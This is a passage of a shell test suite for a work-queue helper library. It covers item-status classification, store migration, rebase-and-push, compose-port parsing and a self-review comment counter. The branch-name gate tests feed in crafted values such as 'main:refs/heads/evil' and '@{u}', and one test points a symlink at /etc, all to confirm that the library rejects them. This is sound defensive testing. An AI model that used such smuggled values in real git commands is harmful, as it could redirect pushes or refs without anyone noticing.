# `hardening` — the kind behind the nine-invisible-items incident — rides the
# plain enum: todo is READY, ready is invalid (no skipping the ready-mark).
item 075-hard.md 75 "Hardening task" "todo" "[]" "hardening"
item 076-hardready.md 76 "Hardening claiming ready" "ready" "[]" "hardening"
# Unknown kinds ride the FULL plain enum, and can complete: a done one must
# unblock its dependents, or the fallback re-hides finished work.
item 077-unkdone.md 77 "Unknown kind, done" "done" "[]" "features"
item 078-waitunk.md 78 "Waits on unknown done" "todo" "[77]"
item 079-unkprog.md 79 "Unknown kind, in flight" "in-progress" "[]" "features"
# `queued` belongs to the feedback enum only; hoisting it to a wildcard arm
# would let a feature marked queued fall off the roadmap count as `feedback`.
item 080-plainq.md 80 "Plain claiming queued" "queued" "[]"
item 081-featq.md 81 "Feature claiming queued" "queued" "[]" "feature"
item 082-goalq.md 82 "Goal claiming queued" "queued" "[]" "goal"
# Build-enum words on feedback and goal items must be INVALID, not aliased. A
# feedback item at in-progress printing `active` is byte-identical to a
# feature mid-build — the row has no kind — and tier 1 would build it.
item 083-fbprog.md 83 "Feedback claiming in-progress" "in-progress" "[]" "design-feedback"
item 084-fbplan.md 84 "Feedback claiming planning" "planning" "[]" "design-feedback"
item 085-fbdone.md 85 "Feedback claiming done" "done" "[]" "design-feedback"
item 086-waitfbdone.md 86 "Waits on feedback claiming done" "todo" "[85]"
item 087-goalplan.md 87 "Goal claiming planning" "planning" "[]" "goal"
# done_ids must apply the same alphabet gate as the listing: an item printed
# `invalid` for a malformed kind must not unblock its dependents from the
# shadows.
item 088-donewskind.md 88 "Done with whitespace kind" "done" "[]" "foo bar"
item 089-waitws.md 89 "Waits on the malformed one" "todo" "[88]"
# id-less item claiming done: invalid, never `done` — a done row that is not
# in done_ids is a split-brain (listed finished, dependents blocked forever).
printf -- '---\ntitle: No id, claims done\nstatus: done\ndepends_on: []\n---\n' > "$W/090-noiddone.md"
# A dependency that is merely queued is not done.
item 091-waitq.md 91 "Waits on queued feedback" "todo" "[55]"
OUTK2="$(hero_ready_items "$W" 2>/dev/null)"
check "kind: unknown kind claiming ready is invalid" "invalid" "$(state_of 069-badkindready.md "$OUTK2")"
check "kind: hardening todo is READY"             "READY"   "$(state_of 075-hard.md "$OUTK2")"
check "kind: hardening claiming ready is invalid" "invalid" "$(state_of 076-hardready.md "$OUTK2")"
check "kind: unknown kind done is done"           "done"    "$(state_of 077-unkdone.md "$OUTK2")"
check "kind: dep on unknown done is READY"        "READY"   "$(state_of 078-waitunk.md "$OUTK2")"
check "kind: unknown kind in-progress is active"  "active"  "$(state_of 079-unkprog.md "$OUTK2")"
check "kind: plain claiming queued is invalid"    "invalid" "$(state_of 080-plainq.md "$OUTK2")"
check "kind: feature claiming queued is invalid"  "invalid" "$(state_of 081-featq.md "$OUTK2")"
check "kind: goal claiming queued is invalid"     "invalid" "$(state_of 082-goalq.md "$OUTK2")"
check "kind: feedback in-progress is invalid"     "invalid" "$(state_of 083-fbprog.md "$OUTK2")"
check "kind: feedback planning is invalid"        "invalid" "$(state_of 084-fbplan.md "$OUTK2")"
check "kind: feedback done is invalid"            "invalid" "$(state_of 085-fbdone.md "$OUTK2")"
check "kind: dep on feedback-done stays blocked"  "blocked" "$(state_of 086-waitfbdone.md "$OUTK2")"
check "kind: goal planning is invalid"            "invalid" "$(state_of 087-goalplan.md "$OUTK2")"
check "kind: done with malformed kind is invalid" "invalid" "$(state_of 088-donewskind.md "$OUTK2")"
check "kind: dep on it stays blocked (done_ids gated)" "blocked" "$(state_of 089-waitws.md "$OUTK2")"
check "kind: id-less done is invalid, not done"   "invalid" "$(state_of 090-noiddone.md "$OUTK2")"
check "kind: dep on queued feedback stays blocked" "blocked" "$(state_of 091-waitq.md "$OUTK2")"
ERRK2="$(hero_ready_items "$W" 2>&1 >/dev/null)"
printf '%s' "$ERRK2" | grep -q "069-badkindready.md has unrecognized status 'ready'.*new/planning/todo/in-progress/done"
check "kind: unknown+ready names the plain enum on stderr" "0" "$?"
printf '%s' "$ERRK2" | grep -q "048-badkind.md has unrecognized kind 'features'.*never handed out READY"
check "kind: fallback warning says never READY"   "0" "$?"
check "kind: dep on delivered feedback is READY" "READY" "$(state_of 061-waitdf.md "$OUTK2")"
check "kind: dep on rejected feedback is READY"  "READY" "$(state_of 062-waitrej.md "$OUTK2")"
check "kind: unknown kind claiming delivered is invalid" "invalid" "$(state_of 063-fakedeliv.md "$OUTK2")"
check "kind: dep on it stays blocked"            "blocked" "$(state_of 064-waitfake.md "$OUTK2")"

# Clean up so later sections' listings aren't polluted by these fixtures.
rm -f "$W"/03[0-9]-*.md "$W"/04[0-9]-*.md "$W"/05[0-9]-*.md "$W"/06[0-9]-*.md "$W"/07[0-9]-*.md "$W"/08[0-9]-*.md "$W"/09[0-9]-*.md

# ---------- hero_work_store migration ---------------------------------------
#
# The only mutating function: an mv of the agent's entire work queue. Each
# case pins a path a refactor of the migration loop could silently drop.

R1="$TMP/mig1"; git init -q "$R1"
mkdir "$R1/my-work"; printf -- '---\nid: 1\ntitle: L\nstatus: todo\ndepends_on: []\n---\n' > "$R1/my-work/001-x.md"
S1="$(hero_work_store "$R1" 2>/dev/null)"
check "store: returns the .plans path"     "$R1/.plans" "$S1"
check "store: legacy item migrated"        "yes" "$([ -e "$R1/.plans/001-x.md" ] && echo yes)"
check "store: legacy dir gone after move"  "yes" "$([ ! -e "$R1/my-work" ] && echo yes)"
grep -qxF ".plans/" "$R1/.git/info/exclude"
check "store: .plans excluded in the TARGET repo" "0" "$?"
check "store: second call is idempotent"   "$R1/.plans" "$(hero_work_store "$R1" 2>/dev/null)"

# Symlink refusal — only when a migration would actually happen. A stale
# legacy symlink next to a healthy .plans/ must not brick the store.
R2="$TMP/mig2"; git init -q "$R2"; ln -s /etc "$R2/my-work"
hero_work_store "$R2" >/dev/null 2>&1
check "store: symlinked legacy refused when migrating" "1" "$?"
check "store: no .plans created on refusal" "yes" "$([ ! -e "$R2/.plans" ] && echo yes)"
mkdir "$R2/.plans"
S2="$(hero_work_store "$R2" 2>/dev/null)"
check "store: healthy .plans survives a legacy symlink" "$R2/.plans" "$S2"

# Both legacy dirs: my-work (newer) wins; shadowed plan-work is warned loudly.
R3="$TMP/mig3"; git init -q "$R3"
mkdir "$R3/my-work" "$R3/plan-work"; touch "$R3/my-work/a.md" "$R3/plan-work/b.md"
ERR3="$(hero_work_store "$R3" 2>&1 >/dev/null)"
check "store: my-work wins over plan-work" "yes" "$([ -e "$R3/.plans/a.md" ] && echo yes)"
printf '%s' "$ERR3" | grep -q "both plan-work/ and .plans/ exist"
check "store: shadowed plan-work warned loudly" "0" "$?"

# A worktree shares the primary checkout's store.
# pre-commit exports GIT_DIR for the outer repo; `git worktree add` must not
# see it or the worktree is created against hero-skills itself.
R5="$TMP/wt-main"; git init -q "$R5"; git -C "$R5" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init
(unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE; git -C "$R5" worktree add -q "$TMP/wt-side" -b side 2>/dev/null)
# hero_store_path is the read-only half: it must answer without creating the
# store or touching the exclude file, or resume-state becomes a writer.
R6="$TMP/r6"; git init -q "$R6"
check "store_path: prints the store path"             "$R6/.plans" "$(hero_store_path "$R6")"
check "store_path: does not create the store"         "no" "$([ -e "$R6/.plans" ] && echo yes || echo no)"
check "store_path: exclude untouched"                 "no" "$(grep -qs "\.plans" "$R6/.git/info/exclude" && echo yes || echo no)"
check "store: a worktree resolves to the primary checkout's .plans" \
  "$(cd "$R5" && pwd -P)/.plans" "$(hero_work_store "$TMP/wt-side" 2>/dev/null)"

# ---------- hero_rebase_on_base ---------------------------------------------
#
# Mutating (rebase + force-with-lease push), so every branch of it is pinned
# against a real origin: up to date, behind-and-clean, conflict (must abort
# and leave the branch as it was), dirty tree, and the worktree predicate.

(
  unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE
  export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t
  O="$TMP/origin.git"; git init -q --bare "$O"
  A="$TMP/cloneA"; git clone -q "$O" "$A" 2>/dev/null
  cd "$A" && git checkout -q -b main && echo base > f && git add f && git commit -q -m base && git push -q -u origin main 2>/dev/null
  git checkout -q -b feat && echo feat > g && git add g && git commit -q -m feat && git push -q -u origin feat 2>/dev/null
  hero_rebase_on_base main 2>/dev/null; echo "current=$?"
  # main moves underneath (another clone), no overlap → rebase + push.
  B="$TMP/cloneB"; git clone -q "$O" "$B" 2>/dev/null
  (cd "$B" && git checkout -q main && echo more > h && git add h && git commit -q -m more && git push -q origin main 2>/dev/null)
  hero_rebase_on_base main 2>/dev/null; echo "rebased=$?"
  echo "hasbase=$(git merge-base --is-ancestor origin/main HEAD && echo yes)"
  echo "pushed=$(git rev-parse HEAD)=$(git rev-parse origin/feat)"
  # Conflict: both sides edit f. Must abort, branch unchanged.
  (cd "$B" && echo theirs > f && git commit -q -am theirs && git push -q origin main 2>/dev/null)
  echo mine > f && git commit -q -am mine; BEFORE=$(git rev-parse HEAD)
  hero_rebase_on_base main 2>"$TMP/conflict.err"; echo "conflict=$?"
  echo "unchanged=$([ "$(git rev-parse HEAD)" = "$BEFORE" ] && echo yes)"
  echo "norebase=$([ ! -d .git/rebase-merge ] && [ ! -d .git/rebase-apply ] && echo yes)"
  echo "named=$(grep -c '^  f$' "$TMP/conflict.err")"
  echo dirty > g
  hero_rebase_on_base main 2>/dev/null; echo "dirty=$?"
  git checkout -q -- g
  hero_rebase_on_base 'bad name' 2>/dev/null; echo "badbase=$?"
  git worktree add -q "$TMP/wt-rb" -b wt-rb 2>/dev/null
  hero_in_worktree "$TMP/wt-rb"; echo "wt=$?"
  hero_in_worktree "$A"; echo "primary=$?"
) > "$TMP/rebase.out" 2>/dev/null
r() { sed -n "s/^$1=//p" "$TMP/rebase.out"; }
check "rebase: up to date returns 0"                     "0"   "$(r current)"
check "rebase: behind and clean rebases, returns 0"      "0"   "$(r rebased)"
check "rebase: base is now an ancestor"                  "yes" "$(r hasbase)"
check "rebase: pushed with lease (origin matches HEAD)"  "yes" "$([ "$(r pushed | cut -d= -f1)" = "$(r pushed | cut -d= -f2)" ] && echo yes)"
check "rebase: conflict returns 1"                       "1"   "$(r conflict)"
check "rebase: conflict leaves the branch unchanged"     "yes" "$(r unchanged)"
check "rebase: conflict leaves no rebase in progress"    "yes" "$(r norebase)"
check "rebase: conflict names the file"                  "1"   "$(r named)"
check "rebase: dirty tree returns 2"                     "2"   "$(r dirty)"
check "rebase: invalid base returns 2"                   "2"   "$(r badbase)"
check "worktree: a linked worktree is detected"          "0"   "$(r wt)"
check "worktree: the primary checkout is not"            "1"   "$(r primary)"

# ---------- hero_compose_port ------------------------------------------------
C="$TMP/compose"; mkdir -p "$C/a" "$C/b" "$C/c" "$C/d"
printf 'ports:\n  - "2222:3000"\n' > "$C/a/docker-compose.dev.yaml"
printf 'ports:\n  - ${HOST_PORT:-1111}:3000\n' > "$C/a/docker-compose.dev.yml"
check "compose: .yaml is read before .yml" "2222" "$(hero_compose_port "$C/a")"
printf 'ports:\n  - "4444:3000"\n  - ${HOST_PORT:-3333}:3000\n' > "$C/b/compose.yaml"
check "compose: HOST_PORT default beats an earlier literal" "3333" "$(hero_compose_port "$C/b")"
printf 'ports:\n  # - ${HOST_PORT:-6666}:3000\n  - target: 3000\n    published: 7777\n' > "$C/c/docker-compose.yaml"
check "compose: commented-out HOST_PORT ignored, long-syntax published read" "7777" "$(hero_compose_port "$C/c")"
check "compose: no compose file is -" "-" "$(hero_compose_port "$C/d")"

# Explicit-root safety: run from a NON-repo cwd, the store must land in (and
# only mutate) the target repo — previously the exclude writes hit the cwd.
R4="$TMP/mig4"; git init -q "$R4"
NOREPO="$TMP/norepo"; mkdir -p "$NOREPO"
S4="$(cd "$NOREPO" && hero_work_store "$R4" 2>/dev/null)"
check "store: explicit root works from non-repo cwd" "$R4/.plans" "$S4"
grep -qxF ".plans/" "$R4/.git/info/exclude"
check "store: excludes written to the target repo" "0" "$?"
hero_work_store "$NOREPO" >/dev/null 2>&1
check "store: non-repo root still refused" "1" "$?"

# ---------- branch-name gate -----------------------------------------------
#
# hero_field's character gate cannot catch a value that is a valid STRING but
# not a valid BRANCH: git reads these as something other than the branch they
# resemble. This gate existed but was never wired to a caller.

branch_case() { # value expected
  printf '# H\n\n- default-branch: %s\n' "$1" > "$TMP/cfg/HERO.md"
  check "branch: $1" "$2" "$(hero_default_branch "$TMP/cfg" 2>/dev/null)"
}
branch_case "main:refs/heads/evil" "main"
branch_case "main^"                "main"
branch_case "@{u}"                 "main"
branch_case ".."                   "main"
branch_case "develop"              "develop"
branch_case "release/2.0"          "release/2.0"

# ---------- report ---------------------------------------------------------

# ---------- hero_self_review_count -----------------------------------------
#
# The stub honors --jq: a stub that cats raw JSON makes the function print an
# array, which compares equal to nothing and passes an assertion by accident.
mkdir -p "$TMP/ghbin"
cat > "$TMP/ghbin/gh" <<'GH'
#!/bin/sh
[ -n "${GH_FAIL:-}" ] && exit 1
Q=""
while [ $# -gt 0 ]; do [ "$1" = --jq ] && { shift; Q=$1; }; shift; done
if [ "$Q" = ".login" ]; then echo me; else jq "$Q" "$(dirname "$0")/comments.json"; fi
GH
chmod +x "$TMP/ghbin/gh"
cat > "$TMP/ghbin/comments.json" <<'JSON'
[{"body":"lgtm","user":{"login":"me"}},
 {"body":"<!-- ai-hero:self-review -->","user":{"login":"stranger"}},
 {"body":"<!-- ai-hero:self-review -->","user":{"login":"me"}}]
JSON
check "self-review count: only own marker comments"  "1" "$(PATH="$TMP/ghbin:$PATH" hero_self_review_count 7)"
check "self-review count: gh failure prints nothing" ""  "$(GH_FAIL=1 PATH="$TMP/ghbin:$PATH" hero_self_review_count 7 2>/dev/null)"
GH_FAIL=1 PATH="$TMP/ghbin:$PATH" hero_self_review_count 7 >/dev/null 2>&1
check "self-review count: gh failure returns non-zero" "no" "$([ $? -eq 0 ] && echo yes || echo no)"
# The workflow carries its own copy of the marker; the two must agree.
check "self-review marker matches the workflow's" "yes" "$(grep -q "$HERO_SELF_REVIEW_MARKER" "$(dirname "$0")/../.github/workflows/auto-approve.yaml" && echo yes || echo no)"

if [ "$FAIL" -gt 0 ]; then
  echo "hero-lib: $PASS passed, $FAIL FAILED"
  exit 1
fi
# Floor on the case count. Neither suite runs under `set -e`, so a setup line
# that starts failing does not fail the run — it just stops incrementing PASS,
# and a block whose glob went empty runs zero iterations. Without this, a
# refactor that silently stops executing 25 cases still reports 0 failures and
# exits 0. The whole reason these cases exist is that each one could be wrong
# SILENTLY; the suite must not be able to go quiet the same way.
MIN_CASES=106
if [ "$PASS" -lt "$MIN_CASES" ]; then
  echo "hero-lib: only $PASS cases ran, expected >= $MIN_CASES — a block stopped executing" >&2
  exit 1
fi
echo "hero-lib: $PASS passed"
